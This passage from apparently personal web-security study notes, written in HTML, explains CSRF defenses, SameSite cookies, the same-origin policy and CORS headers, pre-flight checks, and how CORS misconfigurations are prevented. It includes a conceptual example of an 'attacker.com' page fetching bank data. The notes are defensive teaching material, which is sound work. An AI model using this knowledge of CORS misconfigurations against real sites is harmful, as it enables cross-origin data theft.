                      <li style="margin-bottom: 10px;">When a subsequent request is received that requires validation, the server-side application should verify that the request includes a token which matches the value that was stored in the user's session.</li>
                      <li style="margin-bottom: 10px;">This validation must be performed regardless of the HTTP method or content type of the request.</li>
                    </ul>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">2 &rarr; SameSite cookies &rarr;</h3>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;"><strong>&rarr; Browser Security mechanism determine website cookies included in request originated from other website</strong></p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">The site is <code>TLD, TLD+1 and the schema</code></li>
                    </ul>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;">The possible attribute values are:</p>
                    <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin-bottom: 20px; overflow-x: auto;">Set-Cookie: session=0F8tgdOhi9ynR1M9wa3ODa; SameSite=Strict</code>

                    <p style="font-size: 1.2rem; margin-bottom: 10px; font-weight: bold;">1 &rarr; Strict &rarr;</p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;"><strong>Send the cookie only for requests originating from the same site that set the cookie.</strong></li>
                      <li style="margin-bottom: 10px;"><strong>Browsers will not send it in any cross-site requests.</strong></li>
                    </ul>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;">In simple terms, this means that if the target site for the request does not match the site currently shown in the browser's address bar, it will not include the cookie.</p>

                    <p style="font-size: 1.2rem; margin-bottom: 10px; font-weight: bold;">2 &rarr; None &rarr;</p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;"><strong>Send the cookie with both cross-site and same-site requests.</strong></li>
                      <li style="margin-bottom: 10px;"><strong>The <code>Secure</code> attribute must also be set when using this value.</strong></li>
                      <li style="margin-bottom: 10px;"><strong>This effectively disables SameSite restrictions.</strong></li>
                    </ul>

                    <p style="font-size: 1.2rem; margin-bottom: 10px; font-weight: bold;">3 &rarr; Lax &rarr;</p>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;"><code>Lax</code> SameSite restrictions mean that browsers will send the cookie in cross-site requests, but only if both of the following conditions are met:</p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">The request uses the <code>GET</code> method.</li>
                      <li style="margin-bottom: 10px;"><strong>Triggered by a top-level navigation</strong> (like the user clicking a link, typing a URL, or refreshing).</li>
                    </ul>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">3 &rarr; Referer-based validation &rarr;</h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Some applications make use of the HTTP <code>Referer</code> header to attempt to defend against CSRF attacks, normally by verifying that the request originated from the application's own domain.</li>
                      <li style="margin-bottom: 10px;">This is generally less effective than CSRF token validation.</li>
                    </ul>

                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; Resources &rarr;</h2>
                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 15px; margin-bottom: 40px;">
                      <a href="https://www.notion.so/CSRF-Attacks" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">CSRF Attacks <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                      <a href="https://www.notion.so/Writeups" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">Writeups <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                      <a href="https://www.notion.so/Notes" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">Notes <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                      <a href="https://www.notion.so/Vulnerable-codes-and-mitigation" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">Vuln Codes &amp; Mitigations <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                      <a href="https://www.notion.so/Methodology" target="_blank" style="background-color: var(--color-white, #ffffff); padding: 15px 20px; border-radius: 8px; color: #2563eb; text-decoration: none; font-size: 1.1rem; font-weight: 600; box-shadow: 0 2px 5px rgba(0,0,0,0.05); border: 1px solid #e5e7eb; transition: all 0.3s ease; display: flex; align-items: center; justify-content: space-between;">Methodology <i class="fa-solid fa-external-link-alt" style="font-size: 0.9em; opacity: 0.7;"></i></a>
                    </div>
                  </div>
                </div>
              </div>
            </article>

            <article class="section">
              <div class="section__title">
                <h2 class="section__title__text">
                  Cross-Origin Resource Sharing (CORS)
                </h2>
                <span><i class="fa-solid fa-arrow-down" style="color: #7380ce; font-size: large;"></i></span>
              </div>

              <div class="section__text">
                <div style="width: 100%; margin: 0; padding: 0; background-color: var(--color-background, #ffffff); color: var(--color-dark, #1f2937); font-family: 'Segoe UI', Tahoma, sans-serif; line-height: 1.7; transition: all 0.3s ease;">
                  <div style="padding: 40px 6%;">
                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-bottom: 20px;">&rarr; What is CORS? &rarr;</h2>
                    
                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">Simple Explain &rarr;</h3>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;"><strong>CORS (Cross-Origin Resource Sharing)</strong> is a <strong>browser mechanism</strong> that allows a server to decide &rarr;</p>
                    <div style="background-color: var(--color-white, #f3f4f6); padding: 20px; border-left: 4px solid #3b82f6; margin-bottom: 20px; font-style: italic;">
                      "Which external origins are allowed to read my responses?"
                    </div>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">It is an <strong>extension of SOP</strong>, not a replacement.</li>
                    </ul>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">Why CORS exist?</h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">By default, the <strong>Same-Origin Policy (SOP)</strong> blocks JavaScript from reading responses from another origin.</li>
                    </ul>
                    <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin-bottom: 20px; overflow-x: auto;">fetch("https://api.bank.com/data")
--------------------------------------
if executed from https://attacker.com</code>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">SOP blocks reading the response.</li>
                      <li style="margin-bottom: 10px;">CORS allows the server to override this restriction safely.</li>
                    </ul>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">How CORS Works (Simple Flow)</h3>
                    <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin-bottom: 20px; overflow-x: auto;">(1) Browser sends request with -&gt; Origin: https://attacker.com

(2) Server responds with -&gt; Access-Control-Allow-Origin: https://attacker.com</code>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Now the browser allows JavaScript to read the response.</li>
                      <li style="margin-bottom: 10px;">If the header is missing &rarr; browser blocks access.</li>
                    </ul>
                    <p style="font-size: 1.2rem; margin-bottom: 20px; font-weight: bold; color: #ef4444;">&rarr; CORS is NOT protection against CSRF.</p>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">From PortSwigger &rarr;</h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Cross-origin resource sharing (CORS) is a browser mechanism which enables controlled access to resources located outside of a given domain.</li>
                      <li style="margin-bottom: 10px;"><strong>It extends and adds flexibility to the same-origin policy (SOP).</strong></li>
                      <li style="margin-bottom: 10px;">However, it also provides potential for cross-domain attacks, if a website's CORS policy is poorly configured and implemented.</li>
                      <li style="margin-bottom: 10px;"><strong>CORS is not a protection against cross-origin attacks such as cross-site request forgery (CSRF).</strong></li>
                    </ul>

                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; Same Origin Policy &rarr;</h2>
                    
                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">What is the same-origin policy?</h3>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;"><strong>&rarr; browser security mechanism that aims to prevent websites from attacking each other.</strong></p>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;">&rarr; The same-origin policy restricts scripts on one origin from accessing data from another origin.</p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">An origin consists of a <code>URI scheme, domain and port number</code>.</li>
                    </ul>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;"><strong>&rarr; Consider the following URL &rarr;</strong></p>
                    <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin-bottom: 20px; overflow-x: auto;">http://normal-website.com/example/example.html</code>
                    <p style="font-size: 1.2rem; margin-bottom: 20px;">This uses the scheme <code>http</code>, the domain <code>normal-website.com</code>, and the port number <code>80</code>.</p>
                    
                    <div style="overflow-x: auto; margin-bottom: 20px;">
                      <table style="width: 100%; border-collapse: collapse; font-size: 1.2rem; text-align: left; background-color: var(--color-white, #f3f4f6); box-shadow: var(--box-shadow, 0 0.5rem 1rem rgba(0,0,0,0.05)); border-radius: 8px; overflow: hidden;">
                        <thead style="background-color: #2563eb; color: #ffffff;">
                          <tr>
                            <th style="padding: 15px; border-bottom: 2px solid #e5e7eb;">URL accessed</th>
                            <th style="padding: 15px; border-bottom: 2px solid #e5e7eb;">Access permitted?</th>
                          </tr>
                        </thead>
                        <tbody>
                          <tr style="border-bottom: 1px solid #e5e7eb;">
                            <td style="padding: 15px;"><code>http://normal-website.com/example/</code></td>
                            <td style="padding: 15px; color: #16a34a;">Yes: same scheme, domain, and port</td>
                          </tr>
                          <tr style="border-bottom: 1px solid #e5e7eb;">
                            <td style="padding: 15px;"><code>http://normal-website.com/example2/</code></td>
                            <td style="padding: 15px; color: #16a34a;">Yes: same scheme, domain, and port</td>
                          </tr>
                          <tr style="border-bottom: 1px solid #e5e7eb;">
                            <td style="padding: 15px;"><code>https://normal-website.com/example/</code></td>
                            <td style="padding: 15px; color: #dc2626;">No: different scheme and port</td>
                          </tr>
                          <tr style="border-bottom: 1px solid #e5e7eb;">
                            <td style="padding: 15px;"><code>http://en.normal-website.com/example/</code></td>
                            <td style="padding: 15px; color: #dc2626;">No: different domain</td>
                          </tr>
                          <tr style="border-bottom: 1px solid #e5e7eb;">
                            <td style="padding: 15px;"><code>http://www.normal-website.com/example/</code></td>
                            <td style="padding: 15px; color: #dc2626;">No: different domain</td>
                          </tr>
                          <tr>
                            <td style="padding: 15px;"><code>http://normal-website.com:8080/example/</code></td>
                            <td style="padding: 15px; color: #dc2626;">No: different port*</td>
                          </tr>
                        </tbody>
                      </table>
                    </div>
                    <p style="font-size: 1.1rem; color: #6b7280; font-style: italic; margin-bottom: 20px;">*Internet Explorer will allow this access because IE does not take account of the port number when applying the same-origin policy.</p>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">Why is the same-origin policy necessary?</h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">When a browser sends an HTTP request from one origin to another, any cookies, including authentication session cookies, relevant to the other domain are also sent as part of the request.</li>
                      <li style="margin-bottom: 10px;">This means that the response will be generated within the user's session, and include any relevant data that is specific to the user.</li>
                      <li style="margin-bottom: 10px;">Without the same-origin policy, if you visited a malicious website, it would be able to read your emails from GMail, private messages from Facebook, etc.</li>
                    </ul>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">How is the same-origin policy implemented?</h3>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;">&rarr; The same-origin policy generally controls the access that JavaScript code has to content that is loaded cross-domain.</p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;"><strong>Cross-origin loading of page resources is generally permitted.</strong></li>
                      <li style="margin-bottom: 10px;">For example, the SOP allows embedding of images via the <code>&lt;img&gt;</code> tag, media via the <code>&lt;video&gt;</code> tag, and JavaScript via the <code>&lt;script&gt;</code> tag.</li>
                      <li style="margin-bottom: 10px;">However, while these external resources can be loaded by the page, any JavaScript on the page won't be able to read the contents of these resources.</li>
                    </ul>
                    <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin-bottom: 20px; overflow-x: auto;">&lt;img src="https://bank.com/logo.png"&gt;
&lt;script src="https://cdn.com/lib.js"&gt;&lt;/script&gt;
&lt;video src="https://media.com/movie.mp4"&gt;&lt;/video&gt;</code>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;">The browser &rarr;</p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Sends the HTTP request</li>
                      <li style="margin-bottom: 10px;">Receives the response</li>
                      <li style="margin-bottom: 10px;">Uses it (display image, execute script, play video)</li>
                    </ul>
                    <p style="font-size: 1.2rem; margin-bottom: 20px;"><strong>This is allowed cross-origin.</strong></p>

                    <p style="font-size: 1.2rem; margin-bottom: 10px; font-weight: bold;">&rarr; There are various exceptions to the same-origin policy &rarr;</p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Some objects are writable but not readable cross-domain, such as the <code>location</code> object or the <code>location.href</code> property from iframes or new windows.</li>
                      <li style="margin-bottom: 10px;">Some objects are readable but not writable cross-domain, such as the <code>length</code> property of the <code>window</code> object (which stores the number of frames being used on the page) and the <code>closed</code> property.</li>
                      <li style="margin-bottom: 10px;">The <code>replace</code> function can generally be called cross-domain on the <code>location</code> object.</li>
                      <li style="margin-bottom: 10px;">You can call certain functions cross-domain. For example, you can call the functions <code>close</code>, <code>blur</code> and <code>focus</code> on a new window. The <code>postMessage</code> function can also be called on iframes and new windows in order to send messages from one domain to another.</li>
                      <li style="margin-bottom: 10px;">Due to legacy requirements, the same-origin policy is more relaxed when dealing with cookies, so they are often accessible from all subdomains of a site even though each subdomain is technically a different origin.</li>
                      <li style="margin-bottom: 10px;">You can partially mitigate this risk using the <code>HttpOnly</code> cookie flag.</li>
                    </ul>

                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; CORS and the Access-Control-Allow-Origin response header &rarr;</h2>
                    
                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">What is the Access-Control-Allow-Origin response header?</h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">The <code>Access-Control-Allow-Origin</code> header is included in the response from one website to a request originating from another website, and <strong>identifies the permitted origin of the request.</strong></li>
                      <li style="margin-bottom: 10px;">A web browser compares the Access-Control-Allow-Origin with the requesting website's origin and permits access to the response if they match.</li>
                    </ul>
                    <div style="background-color: var(--color-white, #f3f4f6); padding: 25px; border-radius: 12px; border-left: 6px solid #eab308; box-shadow: var(--box-shadow, 0 0.5rem 1rem rgba(0,0,0,0.05)); margin: 30px 0;">
                      <p style="font-size: 1.2rem; margin: 0;"><code>Access-Control-Allow-Origin</code> is a server response header that tells the browser which external origin is allowed to read the response in a cross-origin request.</p>
                    </div>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">Implementing simple cross-origin resource sharing &rarr;</h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">The cross-origin resource sharing (CORS) specification prescribes header content exchanged between web servers and browsers that restricts origins for web resource requests outside of the origin domain.</li>
                    </ul>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;">&rarr; The CORS specification identifies a collection of protocol headers of which <code>Access-Control-Allow-Origin</code> is the most significant.</p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">This header is returned by a server when a website requests a cross-domain resource, with an <code>Origin</code> header added by the browser.</li>
                    </ul>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;">&rarr; For example, suppose a website with origin <code>normal-website.com</code> causes the following cross-domain request &rarr;</p>
                    <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin-bottom: 20px; overflow-x: auto;">GET /data HTTP/1.1
Host: robust-website.com
Origin: https://normal-website.com</code>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;">The server on <code>robust-website.com</code> returns the following response &rarr;</p>
                    <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin-bottom: 20px; overflow-x: auto;">HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://normal-website.com</code>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">The browser will allow code running on <code>normal-website.com</code> to access the response because the origins match.</li>
                    </ul>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;">&rarr; The specification of <code>Access-Control-Allow-Origin</code> allows for multiple origins, or the value <code>null</code>, or the wildcard <code>*</code>.</p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">However, no browser supports multiple origins and there are restrictions on the use of the wildcard <code>*</code>.</li>
                    </ul>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">Handling cross-origin resource requests with credentials &rarr;</h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">The default behavior of <strong>cross-origin resource requests</strong> is for requests to be passed without credentials like cookies and the Authorization header.</li>
                      <li style="margin-bottom: 10px;">However, the cross-domain server can permit reading of the response when credentials are passed to it by setting the CORS <code>Access-Control-Allow-Credentials</code> header to true.</li>
                    </ul>
                    <div style="background-color: var(--color-white, #f3f4f6); padding: 25px; border-radius: 12px; border-left: 6px solid #eab308; box-shadow: var(--box-shadow, 0 0.5rem 1rem rgba(0,0,0,0.05)); margin: 30px 0;">
                      <p style="font-size: 1.2rem; margin: 0;">When credentials are included in a cross-origin request, the browser will only expose the response to JavaScript if the server explicitly allows both the origin and credentialed access via CORS headers.</p>
                    </div>
                    <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin-bottom: 20px; overflow-x: auto;">GET /data HTTP/1.1
Host: robust-website.com
...
Origin: https://normal-website.com
Cookie: JSESSIONID=&lt;value&gt;</code>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;">And the response to the request is &rarr;</p>
                    <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin-bottom: 20px; overflow-x: auto;">HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://normal-website.com
Access-Control-Allow-Credentials: true</code>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Then the browser will permit the requesting website to read the response, because the <code>Access-Control-Allow-Credentials</code> response header is set to <code>true</code>. Otherwise, the browser will not allow access to the response.</li>
                    </ul>
                    <div style="background-color: var(--color-white, #f3f4f6); padding: 25px; border-radius: 12px; border-left: 6px solid #eab308; box-shadow: var(--box-shadow, 0 0.5rem 1rem rgba(0,0,0,0.05)); margin: 30px 0;">
                      <p style="font-size: 1.2rem; margin-bottom: 10px;"><strong>If a cross-origin request includes cookies, must the response contain <code>Access-Control-Allow-Credentials: true</code> for JS to read it?</strong></p>
                      <p style="font-size: 1.2rem; margin-bottom: 10px; color: #16a34a;">&check; Yes.</p>
                      <p style="font-size: 1.2rem; margin-bottom: 0;">But it must also contain a matching <code>Access-Control-Allow-Origin</code>. Without both headers, the browser will block JS access to the response.</p>
                    </div>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">Relaxation of CORS specifications with wildcards &rarr;</h3>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;">The header <code>Access-Control-Allow-Origin</code> supports wildcards. For example &rarr;</p>
                    <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin-bottom: 20px; overflow-x: auto;">Access-Control-Allow-Origin: *</code>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;">&rarr; Note that wildcards cannot be used within any other value. For example, the following header is <strong>not</strong> valid &rarr;</p>
                    <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin-bottom: 20px; overflow-x: auto;">Access-Control-Allow-Origin: https://*.normal-website.com</code>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;">&rarr; Fortunately, from a security perspective, the use of the wildcard is restricted in the specification as you cannot combine the wildcard with the cross-origin transfer of credentials (authentication, cookies or client-side certificates).</p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Consequently, a cross-domain server response of the form &rarr;</li>
                    </ul>
                    <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin-bottom: 20px; overflow-x: auto;">Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true</code>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">is not permitted as this would be dangerously insecure, exposing any authenticated content on the target site to everyone.</li>
                    </ul>
                    <p style="font-size: 1.2rem; margin-bottom: 20px;">&rarr; Given these constraints, some web servers dynamically create <code>Access-Control-Allow-Origin</code> headers based upon the client-specified origin. This is a workaround for CORS constraints that is not secure.</p>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">Pre-flight checks &rarr;</h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">A <strong>pre-flight request</strong> is an initial <code>OPTIONS</code> request sent by the browser <strong>before the actual cross-origin request</strong>.</li>
                      <li style="margin-bottom: 10px;">To ask the server whether the cross-origin request is safe Ã¢â‚¬â€ specifically when using <strong>non-simple methods</strong> (PUT, DELETE, PATCH) or <strong>custom headers</strong>.</li>
                      <li style="margin-bottom: 10px;">This protects legacy resources from unexpected or potentially dangerous requests.</li>
                    </ul>

                    <p style="font-size: 1.2rem; margin-bottom: 10px; font-weight: bold;">1 &rarr; Browser sends pre-flight &rarr;</p>
                    <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin-bottom: 20px; overflow-x: auto;">OPTIONS /data HTTP/1.1
Host: api.example.com
Origin: https://normal-website.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: Special-Request-Header</code>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;"><code>Access-Control-Request-Method</code> &rarr; the HTTP method that will be used</li>
                      <li style="margin-bottom: 10px;"><code>Access-Control-Request-Headers</code> &rarr; any custom headers to be sent</li>
                    </ul>

                    <p style="font-size: 1.2rem; margin-bottom: 10px; font-weight: bold;">2 &rarr; Server respond with &rarr;</p>
                    <code style="display: block; background: #1e1e1e; color: #4ade80; padding: 20px; border-radius: 8px; font-family: monospace; font-size: 1.1rem; margin-bottom: 20px; overflow-x: auto;">HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://normal-website.com
Access-Control-Allow-Methods: PUT, POST, OPTIONS
Access-Control-Allow-Headers: Special-Request-Header
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 240</code>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;"><strong><code>Access-Control-Allow-Origin</code></strong> &rarr; allowed origin</li>
                      <li style="margin-bottom: 10px;"><strong><code>Access-Control-Allow-Methods</code></strong> &rarr; which HTTP methods are permitted</li>
                      <li style="margin-bottom: 10px;"><strong><code>Access-Control-Allow-Headers</code></strong> &rarr; which custom headers are allowed</li>
                      <li style="margin-bottom: 10px;"><strong><code>Access-Control-Allow-Credentials</code></strong> &rarr; if JS can read the response with credentials</li>
                      <li style="margin-bottom: 10px;"><strong><code>Access-Control-Max-Age</code></strong> &rarr; how long the browser can cache this pre-flight response</li>
                    </ul>

                    <p style="font-size: 1.2rem; margin-bottom: 10px; font-weight: bold;">3 &rarr; Browser decides &rarr;</p>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Origin matches</li>
                      <li style="margin-bottom: 10px;">Method is allowed</li>
                      <li style="margin-bottom: 10px;">Headers are allowed</li>
                    </ul>
                    <p style="font-size: 1.2rem; margin-bottom: 10px;">&rarr; Browser proceeds with the <strong>actual cross-origin request</strong> (PUT with <code>Special-Request-Header</code>).</p>
                    <p style="font-size: 1.2rem; margin-bottom: 20px; color: #ef4444;">If any check fails &rarr; request is <strong>blocked</strong>.</p>
                    <div style="background-color: var(--color-white, #f3f4f6); padding: 25px; border-radius: 12px; border-left: 6px solid #eab308; box-shadow: var(--box-shadow, 0 0.5rem 1rem rgba(0,0,0,0.05)); margin: 30px 0;">
                      <p style="font-size: 1.2rem; margin: 0;">A <strong>pre-flight request</strong> is an automatic <code>OPTIONS</code> check by the browser to ask a server whether a cross-origin request using non-simple methods or headers is permitted, and only if the server responds positively will the real request be sent.</p>
                    </div>

                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">Does CORS protect against CSRF?</h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">CORS does not provide protection against cross-site request forgery (CSRF) attacks, this is a common misconception.</li>
                      <li style="margin-bottom: 10px;">CORS is a controlled relaxation of the same-origin policy, so poorly configured CORS may actually increase the possibility of CSRF attacks or exacerbate their impact.</li>
                      <li style="margin-bottom: 10px;">There are various ways to perform CSRF attacks without using CORS, including simple HTML forms and cross-domain resource includes.</li>
                    </ul>

                    <h2 style="font-size: 1.8rem; font-weight: 700; color: #2563eb; border-bottom: 2px solid #2563eb; padding-bottom: 10px; margin-top: 50px; margin-bottom: 20px;">&rarr; How to prevent CORS-based attacks &rarr;</h2>
                    <p style="font-size: 1.2rem; margin-bottom: 20px;">CORS vulnerabilities arise primarily as misconfigurations. Prevention is therefore a configuration problem.</p>
                    
                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">Proper configuration of cross-origin requests</h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">If a web resource contains sensitive information, the origin should be properly specified in the <code>Access-Control-Allow-Origin</code> header.</li>
                    </ul>
                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">Only allow trusted sites</h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">It may seem obvious but origins specified in the <code>Access-Control-Allow-Origin</code> header should only be sites that are trusted.</li>
                      <li style="margin-bottom: 10px;">In particular, dynamically reflecting origins from cross-origin requests without validation is readily exploitable and should be avoided.</li>
                    </ul>
                    <h3 style="font-size: 1.4rem; margin-top: 30px; color: var(--color-dark-varient, #4b5563);">Avoid whitelisting null</h3>
                    <ul style="font-size: 1.2rem; padding-left: 30px; list-style-type: disc;">
                      <li style="margin-bottom: 10px;">Avoid using the header <code>Access-Control-Allow-Origin: null</code>.</li>
                      <li style="margin-bottom: 10px;">Cross-origin resource calls from internal documents and sandboxed requests can specify the <code>null</code> origin.</li>
